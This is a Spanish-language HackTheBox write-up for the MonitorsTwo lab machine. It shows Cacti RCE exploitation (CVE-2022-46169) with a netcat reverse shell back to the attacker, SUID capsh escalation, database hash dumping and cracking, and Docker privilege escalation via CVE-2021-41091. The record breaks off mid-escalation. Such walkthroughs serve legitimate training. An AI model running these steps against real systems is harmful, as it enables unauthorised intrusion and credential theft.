<!DOCTYPE html>
<html lang="es"><head><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">HackTheBox - MonitorsTwo | noname</title>
<meta property="og:title" content="HackTheBox - MonitorsTwo | noname" />
<meta name="twitter:title" content="HackTheBox - MonitorsTwo | noname" />
<meta itemprop="name" content="HackTheBox - MonitorsTwo | noname" />
<meta name="application-name" content="HackTheBox - MonitorsTwo | noname" />
<meta property="og:site_name" content="" />

<meta name="description" content="Writeup MonitorsTwo üü¢">
<meta itemprop="description" content="Writeup MonitorsTwo üü¢" />
<meta property="og:description" content="Writeup MonitorsTwo üü¢" />
<meta name="twitter:description" content="Writeup MonitorsTwo üü¢" />

<meta property="og:locale" content="es" />
<meta name="language" content="es" />

  <link rel="alternate" hreflang="en" href="https://0x-noname.github.io/writeups/htb/monitorstwo/" title="" />



  <meta itemprop="image" content="https://0x-noname.github.io/machines/htb/monitorstwo/avatar.webp" />
  <meta property="og:image" content="https://0x-noname.github.io/machines/htb/monitorstwo/avatar.webp" />
  <meta name="twitter:image" content="https://0x-noname.github.io/machines/htb/monitorstwo/avatar.webp" />
  <meta name="twitter:image:src" content="https://0x-noname.github.io/machines/htb/monitorstwo/avatar.webp" />




    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2023-09-10T10:30:15&#43;0200 />
    <meta property="article:published_time" content=2023-09-10T10:30:15&#43;0200 />

    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "HackTheBox - MonitorsTwo",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2023-09-10",
        "description": "Writeup MonitorsTwo üü¢",
        "wordCount":  1432 ,
        "mainEntityOfPage": "True",
        "dateModified": "2023-09-10",
        "image": {
        "@type": "imageObject",
        "url": "\/machines\/htb\/monitorstwo\/avatar.webp"
        },
        "publisher": {
        "@type": "Organization",
        "name": "noname"
        }
    }
    </script>



<meta name="generator" content="Hugo 0.125.7">

    

    <link rel="canonical" href="https://0x-noname.github.io/writeups/htb/monitorstwo/">
    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="https://0x-noname.github.io/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    
    
  

</head>
<body data-theme = "" class="notransition">

<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>

<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="https://0x-noname.github.io/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title></title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        $ home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackmyvm/">
                        $ hmv
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackthebox/">
                        $ htb
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/vulnyx/">
                        $ nyx
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/whoami/">
                        $ whoami
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
                
                
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">HackTheBox - MonitorsTwo</h1>
                
                
                <div class="post-meta">
                    <time datetime="2023-09-10T10:30:15&#43;02:00" itemprop="datePublished"> Sep 10, 2023 </time>
                </div>
                
            </header>
            
            <div class="page-content">
                <p><img src="/../machines/htb/monitorstwo/monitorstwo_logo.webp" alt="logo"></p>
<ul>
<li><em>CVE-2022-46169</em></li>
<li><em>Abuse SUID Capsh Binary</em></li>
<li><em>Password Reuse</em></li>
<li><em>CVE-2021-41091 - Privesc</em></li>
</ul>
<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ nmap -p- -T5 -n -v 10.10.11.211
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp open  ssh
</span></span><span class="line"><span class="cl">80/tcp open  http
</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ nmap -sVC -v -p 22,80 10.10.11.211
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
</span></span><span class="line"><span class="cl">| ssh-hostkey: 
</span></span><span class="line"><span class="cl">|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
</span></span><span class="line"><span class="cl">|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
</span></span><span class="line"><span class="cl">|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.18.0 (Ubuntu)
</span></span><span class="line"><span class="cl">|_http-title: Login to Cacti
</span></span><span class="line"><span class="cl">| http-methods: 
</span></span><span class="line"><span class="cl">|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span><span class="line"><span class="cl">|_http-favicon: Unknown favicon MD5: 4F12CCCD3C42A4A478F067337FE92794
</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><h4 id="http-tcp---80">HTTP TCP - 80</h4>
<p>En el servicio web me encuentro un panel de login y la versi√≥n <code>1.2.22</code>.</p>
<p><img src="/../machines/htb/monitorstwo/http.webp" alt="http"></p>
<p>Con searchsploit hago una b√∫squeda y encuentro el siguiente exploit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ searchsploit cacti v1.2.22
</span></span><span class="line"><span class="cl">--------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl"> Exploit Title                                     |  Path
</span></span><span class="line"><span class="cl">--------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl">Cacti v1.2.22 - Remote Command Execution (RCE)     | php/webapps/51166.py
</span></span><span class="line"><span class="cl">--------------------------------------------------- ---------------------------------
</span></span></code></pre></div><p>Descargo el archivo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ searchsploit -m 51166.py
</span></span></code></pre></div><p>Al lanzar el exploit he tenido varios problemas y los he resuelto de la siguiente forma.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">&gt; pip3 install httpx
</span></span></code></pre></div><p>Con nano he editado el exploit en esta parte.</p>
<p><img src="/../machines/htb/monitorstwo/exploit.webp" alt="exploit"></p>
<p>Y el resultado final es este.</p>
<p><img src="/../machines/htb/monitorstwo/exploitmod.webp" alt="exploitmod"></p>
<p>Ahora al lanzar el exploit se ejecuta correctamente.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ python3 exploit.py -u http://10.10.11.211 -p 443 -i 10.10.14.34
</span></span><span class="line"><span class="cl">200 - [{&#34;value&#34;:&#34;30&#34;,&#34;rrd_name&#34;:&#34;proc&#34;,&#34;local_data_id&#34;:&#34;1&#34;}]
</span></span><span class="line"><span class="cl">200 - [{&#34;value&#34;:&#34;1min:0.00 5min:0.00 10min:0.00&#34;,&#34;rrd_name&#34;:&#34;&#34;,&#34;local_data_id&#34;:&#34;2&#34;}]
</span></span><span class="line"><span class="cl">200 - [{&#34;value&#34;:&#34;0&#34;,&#34;rrd_name&#34;:&#34;users&#34;,&#34;local_data_id&#34;:&#34;3&#34;}]
</span></span><span class="line"><span class="cl">200 - [{&#34;value&#34;:&#34;2445276&#34;,&#34;rrd_name&#34;:&#34;mem_buffers&#34;,&#34;local_data_id&#34;:&#34;4&#34;}]
</span></span><span class="line"><span class="cl">200 - [{&#34;value&#34;:&#34;1048572&#34;,&#34;rrd_name&#34;:&#34;mem_swap&#34;,&#34;local_data_id&#34;:&#34;5&#34;}]
</span></span></code></pre></div><p>Ontengo la shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ nc -lvnp 443
</span></span><span class="line"><span class="cl">listening on [any] 443 ...
</span></span><span class="line"><span class="cl">connect to [10.10.14.34] from (UNKNOWN) [10.10.11.211] 33042
</span></span><span class="line"><span class="cl">bash: cannot set terminal process group (1): Inappropriate ioctl for device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">bash-5.1$
</span></span></code></pre></div><p>Realizo el tratamiento de la <strong>tty</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">bash-5.1$ script /dev/null -c bash
</span></span><span class="line"><span class="cl">Script started, output log file is &#39;/dev/null&#39;.
</span></span><span class="line"><span class="cl">CRTL + Z
</span></span><span class="line"><span class="cl">stty raw -echo; fg
</span></span><span class="line"><span class="cl">xterm reset
</span></span><span class="line"><span class="cl">export SHELL=bash
</span></span><span class="line"><span class="cl">bash-5.1$ export TERM=xterm-256color
</span></span><span class="line"><span class="cl">bash-5.1$ source /etc/skel/.bashrc
</span></span><span class="line"><span class="cl">www-data@50bca5e748b0:/var/www/html$ stty rows 50 cols 200
</span></span></code></pre></div><p>Al terminar el tratamiento de la <strong>tty</strong> me doy cuenta que estoy en un contenedor.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">www-data@50bca5e748b0:/var/www/html$ ls -la /
</span></span><span class="line"><span class="cl">total 1356
</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root    4096 Sep 10 10:03 .
</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root    4096 Sep 10 10:03 ..
</span></span><span class="line"><span class="cl">-rwxr-xr-x   1 root root       0 Mar 21 10:49 .dockerenv
</span></span></code></pre></div><p>Realizo una enumeraci√≥n de permisos <strong>SUID</strong> y encuentro el binario <strong>capsh</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">www-data@50bca5e748b0:/tmp$ find / -perm -4000 2&gt;/dev/null
</span></span><span class="line"><span class="cl">/sbin/capsh
</span></span></code></pre></div><p>Puedo elevar privilegios en el contenedor usando este recurso de <a href="https://gtfobins.github.io/gtfobins/capsh/#suid">GTFObins</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">www-data@50bca5e748b0:/tmp$ capsh --gid=0 --uid=0 --
</span></span><span class="line"><span class="cl">root@50bca5e748b0:/tmp# id
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root),33(www-data)
</span></span></code></pre></div><p>En la ra√≠z encuentro el archivo <code>entrypoint.sh</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@50bca5e748b0:/tmp# cat /entrypoint.sh 
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl"><span class="nb">set</span> -ex
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">wait-for-it db:3306 -t <span class="m">300</span> -- <span class="nb">echo</span> <span class="s2">&#34;database is connected&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> ! <span class="k">$(</span>mysql --host<span class="o">=</span>db --user<span class="o">=</span>root --password<span class="o">=</span>root cacti -e <span class="s2">&#34;show tables&#34;</span><span class="k">)</span> <span class="o">=</span>~ <span class="s2">&#34;automation_devices&#34;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    mysql --host<span class="o">=</span>db --user<span class="o">=</span>root --password<span class="o">=</span>root cacti &lt; /var/www/html/cacti.sql
</span></span><span class="line"><span class="cl">    mysql --host<span class="o">=</span>db --user<span class="o">=</span>root --password<span class="o">=</span>root cacti -e <span class="s2">&#34;UPDATE user_auth SET must_change_password=&#39;&#39; WHERE username = &#39;admin&#39;&#34;</span>
</span></span><span class="line"><span class="cl">    mysql --host<span class="o">=</span>db --user<span class="o">=</span>root --password<span class="o">=</span>root cacti -e <span class="s2">&#34;SET GLOBAL time_zone = &#39;UTC&#39;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">chown www-data:www-data -R /var/www/html
</span></span><span class="line"><span class="cl"><span class="c1"># first arg is `-f` or `--some-option`</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">1</span><span class="p">#-</span><span class="si">}</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">	<span class="nb">set</span> -- apache2-foreground <span class="s2">&#34;</span><span class="nv">$@</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">exec</span> <span class="s2">&#34;</span><span class="nv">$@</span><span class="s2">&#34;</span>
</span></span></code></pre></div><p>Busco las bases de datos disponibles y me conecto a <strong>cacti</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">root@50bca5e748b0:/# mysql -h db -u root -p
</span></span><span class="line"><span class="cl">Enter password: 
</span></span><span class="line"><span class="cl">Welcome to the MariaDB monitor.  Commands end with ; or \g.
</span></span><span class="line"><span class="cl">Your MySQL connection id is 969
</span></span><span class="line"><span class="cl">Server version: 5.7.40 MySQL Community Server (GPL)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">MySQL [(none)]&gt; show databases;
</span></span><span class="line"><span class="cl">+--------------------+
</span></span><span class="line"><span class="cl">| Database           |
</span></span><span class="line"><span class="cl">+--------------------+
</span></span><span class="line"><span class="cl">| information_schema |
</span></span><span class="line"><span class="cl">| cacti              |
</span></span><span class="line"><span class="cl">| mysql              |
</span></span><span class="line"><span class="cl">| performance_schema |
</span></span><span class="line"><span class="cl">| sys                |
</span></span><span class="line"><span class="cl">+--------------------+
</span></span><span class="line"><span class="cl">5 rows in set (0.001 sec)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">MySQL [(none)]&gt; use cacti;
</span></span><span class="line"><span class="cl">Reading table information for completion of table and column names
</span></span><span class="line"><span class="cl">You can turn off this feature to get a quicker startup with -A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Database changed
</span></span></code></pre></div><p>Listo las tablas disponibles.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">MySQL [cacti]&gt; show tables;
</span></span><span class="line"><span class="cl">+-------------------------------------+
</span></span><span class="line"><span class="cl">| Tables_in_cacti                     |
</span></span><span class="line"><span class="cl">+-------------------------------------+
</span></span><span class="line"><span class="cl">| user_auth                           |
</span></span><span class="line"><span class="cl">| user_auth_cache                     |
</span></span><span class="line"><span class="cl">| user_auth_group                     |
</span></span><span class="line"><span class="cl">| user_auth_group_members             |
</span></span><span class="line"><span class="cl">| user_auth_group_perms               |
</span></span><span class="line"><span class="cl">| user_auth_group_realm               |
</span></span><span class="line"><span class="cl">+-------------------------------------+
</span></span><span class="line"><span class="cl">111 rows in set (0.001 sec)
</span></span></code></pre></div><p>En el script se aprecia como hace un cambio de contrase√±a al usuario <strong>admin</strong> en la tabla <code>user_auth</code>, por lo tanto selecciono <code>user_auth</code> para ver su contenido.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">MySQL [cacti]&gt; select username, password from user_auth;
</span></span><span class="line"><span class="cl">+----------+--------------------------------------------------------------+
</span></span><span class="line"><span class="cl">| username | password                                                     |
</span></span><span class="line"><span class="cl">+----------+--------------------------------------------------------------+
</span></span><span class="line"><span class="cl">| admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |
</span></span><span class="line"><span class="cl">| guest    | 43e9a4ab75570f5b                                             |
</span></span><span class="line"><span class="cl">| marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |
</span></span><span class="line"><span class="cl">+----------+--------------------------------------------------------------+
</span></span><span class="line"><span class="cl">3 rows in set (0.001 sec)
</span></span></code></pre></div><p>Copio el hash de <strong>marcus</strong> a un archivo para romperlo con john.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ john marcus_hash --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
</span></span><span class="line"><span class="cl">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
</span></span><span class="line"><span class="cl">Cost 1 (iteration count) is 1024 for all loaded hashes
</span></span><span class="line"><span class="cl">Will run 4 OpenMP threads
</span></span><span class="line"><span class="cl">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span><span class="line"><span class="cl">f*********y      (marcus)     
</span></span></code></pre></div><p>Me conecto al sistema como usuario marcus.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ ssh marcus@10.10.11.211
</span></span><span class="line"><span class="cl">The authenticity of host &#39;10.10.11.211 (10.10.11.211)&#39; can&#39;t be established.
</span></span><span class="line"><span class="cl">ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
</span></span><span class="line"><span class="cl">This key is not known by any other names.
</span></span><span class="line"><span class="cl">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span><span class="line"><span class="cl">Warning: Permanently added &#39;10.10.11.211&#39; (ED25519) to the list of known hosts.
</span></span><span class="line"><span class="cl">marcus@10.10.11.211&#39;s password: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System information as of Sun 10 Sep 2023 11:54:16 AM UTC
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System load:                      0.0
</span></span><span class="line"><span class="cl">  Usage of /:                       63.2% of 6.73GB
</span></span><span class="line"><span class="cl">  Memory usage:                     19%
</span></span><span class="line"><span class="cl">  Swap usage:                       0%
</span></span><span class="line"><span class="cl">  Processes:                        262
</span></span><span class="line"><span class="cl">  Users logged in:                  1
</span></span><span class="line"><span class="cl">  IPv4 address for br-60ea49c21773: 172.18.0.1
</span></span><span class="line"><span class="cl">  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
</span></span><span class="line"><span class="cl">  IPv4 address for docker0:         172.17.0.1
</span></span><span class="line"><span class="cl">  IPv4 address for eth0:            10.10.11.211
</span></span><span class="line"><span class="cl">  IPv6 address for eth0:            dead:beef::250:56ff:feb9:218a
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Expanded Security Maintenance for Applications is not enabled.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">0 updates can be applied immediately.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Enable ESM Apps to receive additional future security updates.
</span></span><span class="line"><span class="cl">See https://ubuntu.com/esm or run: sudo pro status
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The list of available updates is more than a week old.
</span></span><span class="line"><span class="cl">To check for new updates run: sudo apt update
</span></span><span class="line"><span class="cl">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">You have mail.
</span></span><span class="line"><span class="cl">marcus@monitorstwo:~$ 
</span></span></code></pre></div><p>Al conectarme al sistema puede apreciar el mensaje <code>You have mail</code> el cual se puede leer en <code>/var/mail</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">marcus@monitorstwo:~$ cat /var/mail/marcus 
</span></span><span class="line"><span class="cl">From: administrator@monitorstwo.htb
</span></span><span class="line"><span class="cl">To: all@monitorstwo.htb
</span></span><span class="line"><span class="cl">Subject: Security Bulletin - Three Vulnerabilities to be Aware Of
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Dear all,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Best regards,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Administrator
</span></span><span class="line"><span class="cl">CISO
</span></span><span class="line"><span class="cl">Monitor Two
</span></span><span class="line"><span class="cl">Security Team
</span></span></code></pre></div><p>Busco la vulnerabilidad <code>CVE-2021-41091</code> y encuetro este <a href="https://github.com/UncleJ4ck/CVE-2021-41091">poc</a>. Siguiendo las instrucciones en la terminal donde tengo la sesi√≥n de docker escribo lo siguiente:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">root@50bca5e748b0:/# chmod u+s /bin/bash
</span></span></code></pre></div><p>Desde la terminal como usuario marcus lanzo el exploit y le digo que si.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">marcus@monitorstwo:/tmp$ ./exp.sh 
</span></span><span class="line"><span class="cl">[!] Vulnerable to CVE-2021-41091
</span></span><span class="line"><span class="cl">[!] Now connect to your Docker container that is accessible and obtain root access !
</span></span><span class="line"><span class="cl">[&gt;] After gaining root access execute this command (chmod u+s /bin/bash)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
</span></span></code></pre></div><p>Detecta la ruta del contenedor pero se cierra la terminal de root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
</span></span><span class="line"><span class="cl">[!] Rooted !
</span></span><span class="line"><span class="cl">[&gt;] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
